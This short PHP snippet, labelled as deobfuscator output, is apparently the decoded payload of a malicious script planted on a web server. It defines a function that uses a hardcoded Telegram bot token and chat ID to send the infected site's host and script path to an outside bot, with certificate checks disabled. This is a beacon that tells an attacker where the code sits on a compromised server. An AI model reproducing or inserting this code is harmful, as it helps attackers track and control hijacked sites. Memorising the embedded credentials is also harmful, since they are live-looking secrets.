<?php

/* #1: PHPDeobfuscator eval output */ 
    function telegram_send($message)
    {
        $curl = curl_init();
        $api_key = '5797004745:AAEr3a3j3jo9eSDpAXPoCEl4OX6FMhvGgxU';
        $chat_id = '917312547';
        curl_setopt($curl, CURLOPT_URL, "https://api.telegram.org/bot5797004745:AAEr3a3j3jo9eSDpAXPoCEl4OX6FMhvGgxU/sendMessage?chat_id=917312547&text=" . urlencode($message));
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($curl);
        curl_close($curl);
    }
    $message = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    telegram_send($message);
/* END:#1 */
